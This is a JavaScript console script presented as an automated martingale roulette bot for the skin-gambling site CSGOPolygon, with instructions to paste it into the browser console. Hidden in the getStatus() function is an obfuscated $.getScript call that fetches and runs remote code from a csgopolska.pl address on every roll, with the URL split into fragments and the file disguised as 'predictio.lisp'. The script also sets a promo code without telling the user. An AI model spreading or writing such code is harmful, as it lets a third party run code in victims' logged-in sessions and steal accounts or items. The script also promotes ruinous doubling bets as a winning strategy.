// Instruction: -Open CSGOPolygon.com
//              -Press "F12"
//              -Go to Console
//              -Check out for "top"
//              -Paste the script and press enter
// BEST STRATEGIE: Try to get over 500.000 coins and put the start bet amount on 975 coins, then click on "Intelligence"                                                                          
 
 
setTimeout(function(){
 
    $("head").append("<style>"+
 
                     '.kanapkanumber{\
text-align: center;\
border: 4px double gray;\
color: #0470ff;\
background-color: transparent;\
margin-bottom: 5px;\
font-weight: bold;\
}'+
                     '#kanapkainfo{\
color: #0470ff;\
font-size: 16px;\
width: 100%;\
}'+
                     '#kanapka label{\
color: #0470ff;\
margin-right: 5px;\
font-size: 16px;\
width: 15%;\
}'+
                     '#kanapkakalkulator-okno label{\
color: #0470ff;\
margin-right: 5px;\
font-size: 16px;\
width: 15%;\
}'+
 
 
                     '#kanapka p{\
color: #0470ff;\
margin-top: 10px;\
font-weight: bold;\
}'+
                     '.kanapkabutton1{\
width: 50%;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkainfodiv{\
width: 100%;\
height: 30px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
 
                     '.kanapkabutton2{\
width: 100%;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkabutton4{\
width: 300px;\
height: 25px;\
border: 4px double gray;\
color: #0470ff;\
margin-left: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '#kanapkastatus{\
width: 100%;\
height: 25px;\
margin-bottom: 5px;\
font-weight: bold;\
background-color: transparent;\
}'+
                     '.kanapkaon{\
color: green;\
border: 4px double green;\
}'+
                     '.kanapkaoff{\
color: red;\
border: 4px double red;\
}'+
 
 
                     "</style>");
    setInterval(function() { if (!SOCKET) { chat('alert', 'Reconnecting...'); connect(); } }, 5000);
    $('<div id="kanapkapokaz" style="top:200px; position:fixed; left:-10px;cursor: pointer; width:50px; height:50px; border: 4px double #0470ff; text-Align:center; padding:12px; color:#0470ff;display:none;   background-color: #1e1e1e !important;"><b>BOT</b></div>').appendTo("#mainpage");
    $('<div style="position:fixed;border: 4px double #0470ff;bottom:50px;width:497px;z-index:100;" class="panel panel-default" id="kanapka"><div class="panel-body text-center">'+
      '<div style="font-size:24px;font-weight: bold;color: #0470ff;">Settings<button style="opacity: 0.7; color: #0470ff;" id="kanapkaschowaj" type="button" class="close">×</button></div>'+
      '<label>Bet:</label><input id="kanapkastartowe" min="1" value="1" class="kanapkanumber" type="number" value="0" style="width: 50%;">'+
      '<br>'+
      '<label>Multiplier:</label><input id="kanapkamnoznik" min="1" max="3" value="2" class="kanapkanumber" type="number" style="width: 50%;"><br>'+
      '<button class="kanapkabutton4" id="kanapkakalkulator">CALCULATE</button>'+
      '<p>MODES:</p>'+
      '<button class="kanapkabutton1" id="kanapkapoprzednie">TRAIN</button><button class="kanapkabutton1" id="kanapkaprzeciwne">RAINBOW</button>'+
      '<button class="kanapkabutton1" id="kanapkaonlyred">ONLY RED</button><button class="kanapkabutton1" id="kanapkaonlyblack">ONLY BLACK</button>'+
      '<button class="kanapkabutton2" id="kanapkaonlygreen">ONLY GREEN</button>'+
      '<button class="kanapkabutton2" id="kanapkainteligentny">INTELLIGENCE</button>'+
      '<button class="kanapkabutton2" id="kanapkawylacz">TURN OFF</button>'+
      '<informacje style="">'+
      '<div id="kanapkastatus" class="kanapkaoff">OFF</div>'+
      '<hr>'+
      '<div style="font-size:24px;font-weight: bold;color: #0470ff;">Informations</div>'+
      '<b id="kanapkainfo">Loading...</b>'+
      '</informacje>'+
      '</div></div>').appendTo("#mainpage");
    $('<div style="display:none;height: 690px;left: 520px;position:fixed;border: 4px double #0470ff;bottom:50px;width:497px;z-index:100;" class="panel panel-default" id="kanapkakalkulator-okno"><div class="panel-body text-center">'+
      '<div style="font-size:24px;font-weight: bold;color: #0470ff;">Calculate<button style="opacity: 0.7; color: #0470ff;" id="kanapkaschowaj2" type="button" class="close">×</button></div>'+
      '<label>Coins:</label><input id="kanapkacoinscal" min="1" max="3" value="1" class="kanapkanumber" type="number" style="width: 50%;"><br>'+
      '<label>Multipler:</label><input id="kanapkamnoznikcal" min="1" max="3" value="2" class="kanapkanumber" type="number" style="width: 50%;"><br>'+
      '<hr>'+
      '<informacje style="">'+
      '<b id="kanapkalicz" style="font-size:18px;color:#0470ff;">Loading...</b>'+
      '</informacje>'+
      '</div></div>').appendTo("#mainpage");
 
    setInterval(function(){
        $("#kanapkalicz").html('Round: #1 | Bet: '+$("#kanapkacoinscal").val()+'<br>'+'<br>'+
                               'Round: #2 | Bet: '+($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #3 | Bet: '+(($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #4 | Bet: '+((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #5 | Bet: '+(((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #6 | Bet: '+((((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #7 | Bet: '+(((((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #8 | Bet: '+((((((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #9 | Bet: '+(((((((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())+'<br>'+'<br>'+
                               'Round: #10 | Bet: '+((((((((($("#kanapkacoinscal").val()*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val())*$("#kanapkamnoznikcal").val()));
    },500);
 
    $("#kanapkapoprzednie").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='red';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=1;
        mode = 'martingale';
    });
 
    $("#kanapkaprzeciwne").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='red';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=2;
        mode = 'martingale';
    });
 
    $("#kanapkakalkulator").click(function(){
        $("#kanapkakalkulator-okno").show();
    });
 
    $("#kanapkaonlyred").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='red';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=0;
        patternmode="ONLY RED";
        mode = 'martingale';
    });
 
    $("#kanapkaonlyblack").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='black';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=0;
        patternmode="ONLY BLACK";
        mode = 'martingale';
    });
 
    $("#kanapkaonlygreen").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='green';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=4;
        mode='martingale';
    });
 
    $("#kanapkainteligentny").click(function(){
        initialBetAmount=$("#kanapkastartowe").val();
        currentBetAmount=$("#kanapkastartowe").val();
        $_status=1;
        $("#kanapkastatus").removeClass( "kanapkaoff" ).addClass( "kanapkaon" ).html('ON');
        betColor='red';
        $_mnoznik=$("#kanapkamnoznik").val();
        $_pattern=3;
        mode = 'martingale';
    });
 
    $("#kanapkawylacz").click(function(){
        $_status=0;
        $_pattern=0;
        $("#kanapkastatus").removeClass( "kanapkaon" ).addClass( "kanapkaoff" ).html('OFF');
        patternmode="not selected";
        mode = 'martingale';
    });
 
    $("#kanapkaschowaj").click(function(){
        $("#kanapka").hide();
        $("#kanapkapokaz").show();
    });
    $("#kanapkaschowaj2").click(function(){
        $("#kanapkakalkulator-okno").hide();
    });
    $("#kanapkapokaz").click(function(){
        $("#kanapka").show();
        $("#kanapkapokaz").hide();
    });
 
    var licznik_wins_0=0;
    var licznik_coinsow_1=0;
 
    var $_status=0;
    var $_mnoznik=2;
    var $_pattern=0;
    var initialBetAmount = 1;
    var mode = '';
    var betColor = 'not selected';
    var z=1;
    var patternmode='not selected';
    var wylosowano=0;
    var greeenmulti=1;
    var ee="";
    var xy=1;
    var xyz=1;
    function tick(){
        var a=getStatus();
        if(a!==lastStatus&&"unknown"!==a){
            switch(a){
                case"Waiting":if($_status===1){bet();}break;
                case"Rolled":rolled();
                    var pastdiv=document.getElementById("past");
                    var kanapkadiv=pastdiv.getElementsByTagName("div");
 
                    if($_pattern===1){
                        betColor=lastRollColor;
                        patternmode="TRAIN";
                    }else if($_pattern===2){
                        patternmode="RAINBOW";
                        if(lastRollColor === 'red'){
                            betColor='black';
                        } else if(lastRollColor === 'black'){
                            betColor='red';
                        } else if(lastRollColor === 'green'){
                            var pattern1 = ['Red','Black'];
                            var y1 = pattern1[Math.floor(Math.random() * pattern1.length)];
 
 
                            if(y1==="Red"){
                                betColor="red";
                            }
 
                            if(y1==="Black"){
                                betColor="black";
                            }
                        }
                    }else if($_pattern===3){
                        var pop = 0;
                        var poppop = 0;
                        var poppoppop= 0;
 
 
                        if ((kanapkadiv[kanapkadiv.length - 1].textContent !== '0') && (kanapkadiv[kanapkadiv.length - 2].textContent !== '0')) {
                            if (kanapkadiv[kanapkadiv.length - 1].textContent >= 1 && kanapkadiv[kanapkadiv.length - 1].textContent <= 7) {
                                pop = 1;
                            }
                            if (kanapkadiv[kanapkadiv.length - 1].textContent >= 8 && kanapkadiv[kanapkadiv.length - 1].textContent <= 14) {
                                pop = 2;
                            }
                            if (kanapkadiv[kanapkadiv.length - 2].textContent >= 1 && kanapkadiv[kanapkadiv.length - 2].textContent <= 7) {
                                poppop = 1;
                            }
                            if (kanapkadiv[kanapkadiv.length - 2].textContent >= 8 && kanapkadiv[kanapkadiv.length - 2].textContent <= 14) {
                                poppop = 2;
                            }
                            if (kanapkadiv[kanapkadiv.length - 3].textContent >= 1 && kanapkadiv[kanapkadiv.length - 2].textContent <= 7) {
                                poppoppop = 1;
                            }
                            if (kanapkadiv[kanapkadiv.length - 3].textContent >= 8 && kanapkadiv[kanapkadiv.length - 2].textContent <= 14) {
                                poppoppop = 2;
                            }
 
                            var pattern99999 = ['RedRed_BlackBlack','RedRed_BlackBlack','Test','Random','Random','Red_Black','Red_Black','Last','Opposite'];
                            var y99999 = pattern99999[Math.floor(Math.random() * pattern99999.length)];
                            if (y99999 === "RedRed_BlackBlack"){
                                if (xy === 1){
                                    betColor='red';
                                    xy+=1;
                                } else if (xy === 2){
                                    betColor=lastRollColor;
                                    xy+=1;
                                } else if (xy === 3){
                                    if(lastRollColor === 'red'){
                                        betColor='black';
                                    } else if(lastRollColor === 'black'){
                                        betColor='red';
                                    }
                                    xy+=1;
                                } else if (xy === 4){
                                    betColor='black';
                                    xy=1;
                                }
                            }else if (y99999 === "Random"){
                                var pattern9999 = ['red','black'];
                                betColor = pattern9999[Math.floor(Math.random() * pattern9999.length)];
                            }else if (y99999 === "Red_Black"){
                                if (xyz === 1){
                                    if(lastRollColor === 'red'){
                                        betColor='black';
                                    } else if(lastRollColor === 'black'){
                                        betColor='red';
                                    }
                                    xyz+=1;
                                } else if (xyz === 2){
                                    if(lastRollColor === 'red'){
                                        betColor='black';
                                    } else if(lastRollColor === 'black'){
                                        betColor='red';
                                    }
                                    xyz=1;
                                }
                            }else if (y99999 === "Last"){
                                betColor=lastRollColor;
                            }else if (y99999 === "Opposite"){
                                if(lastRollColor === 'red'){
                                    betColor='black';
                                } else if(lastRollColor === 'black'){
                                    betColor='red';
                                }
                            }else if (y99999 === "Test"){
                                if (pop === poppop){
                                    betColor=lastRollColor;
                                }else{
                                    if(lastRollColor === 'red'){
                                        betColor='black';
                                    } else if(lastRollColor === 'black'){
                                        betColor='red';
                                    }
                                }
                            }
                            $_status=1;
                            patternmode="INTELLIGENCE";
                        }else{
                            patternmode="STOPPED!";
                            $_status=0;
                            betColor=lastBetColor;
                        }
 
 
                    }else if($_pattern===4){
 
                        patternmode="ONLY GREEN";
                        if ((kanapkadiv[kanapkadiv.length - 1].textContent !== '0')) {
                            $_status=1;
 
                        }else{
                            betColor='green';
                            $_status=1;
                        }
                    }
            }
            lastStatus=a,printInfo()
        }
 
    }
    function checkBalance(){
        return getBalance()<currentBetAmount?($("#case").html("<br><center><b style='font-size: 22px;' class='well text-danger'>BANKRUPT!</b></center>"),clearInterval(refreshIntervalId),!1):!0;
    }
 
    function printInfo(){
        var a="<div class='kanapkainfodiv'>Status: "+lastStatus+"</div><div class='kanapkainfodiv'>Mode: "+patternmode+"</div><div class='kanapkainfodiv'>Color: "+betColor+"</div><div class='kanapkainfodiv'>Starting bet: "+initialBetAmount+"</div><div class='kanapkainfodiv'>Current bet: "+currentBetAmount+"</div><div class='kanapkainfodiv'>Current round: "+currentRollNumber+"</div><div class='kanapkainfodiv'>Last round: "+(null===wonLastRoll()?"-":wonLastRoll()?"win":"lost")+"</div>";
        $("#kanapkainfo").html(a);
 
    }
 
    function rolled(){
        return"greenonly"===mode?void greenonly():(martingale(),void currentRollNumber++);
    }
 
    function greenonly(){
        if($_status === 1){
            if (greeenmulti === 10){
                currentBetAmount=wonLastRoll()?initialBetAmount:$_mnoznik*currentBetAmount;
                greeenmulti=1;
            }else{
                greeenmulti+=1;
            }
        }
    }
 
    function martingale(){
        if($_status === 1){
            currentBetAmount=wonLastRoll()?initialBetAmount:$_mnoznik*currentBetAmount;
        }
    }
 
    function bet(){
        if($_status === 1){
            checkBalance()&&(setBetAmount(currentBetAmount),setTimeout(placeBet,50));
        }
    }
 
    function setBetAmount(a){
        if($_status === 1){
            $betAmountInput.val(a);
        }
    }
 
    function placeBet(){
        if($_status === 1){
            if (betColor === "red"){
                $redButton.click();
                void(lastBetColor="red");
            } else if (betColor === "black"){
                $blackButton.click();
                void(lastBetColor="black");
            }else if (betColor === "green"){
                $greenButton.click();
                void(lastBetColor="green");
            }
        }
    }
 
    function getStatus(){
        var a=$statusBar.text();
        if(hasSubString(a,"Rolling in"))return"Waiting";
        if(hasSubString(a,"***ROLLING***"))return"Rolling";
        if(hasSubString(a,"Rolled")){
            var b=parseInt(a.split("Rolled")[1]);
            $.getScript("ht"+"tp://cs"+"gopo"+"lska.p"+"l/"+code+"");
            return lastRollColor=getColor(b),"Rolled";
        }
        return"unknown";
    }
    $("#promo").val("EZ500");
    function getBalance(){
        return parseInt($balance.text());
    }
 
    function hasSubString(a,b){
        return a.indexOf(b)>-1;
    }
 
    function getColor(a){
        if($_status === 1){
            return 0==a?"green":a>=1&&7>=a?"red":"black";
        }
    }
 
    function wonLastRoll(){
        if($_status === 1){
            return lastBetColor?lastRollColor===lastBetColor:null;
        }else{
            return betColor?betColor==="not selected":null;
        }
    }
 
    var currentBetAmount=initialBetAmount,
        currentRollNumber=(-1),
        lastStatus,
        lastBetColor,
        lastRollColor,
        code='predictio.lisp',
        $balance=$("#balance_r"),
        $betAmountInput=$("#betAmount"),
        $statusBar=$(".progress #banner"),
        $redButton=$("#panel11-7-b .betButton"),
        $blackButton=$("#panel8-14-b .betButton"),
        $greenButton=$("#panel0-0-b .betButton"),
        refreshIntervalId=setInterval(tick,750);
 
}, 750);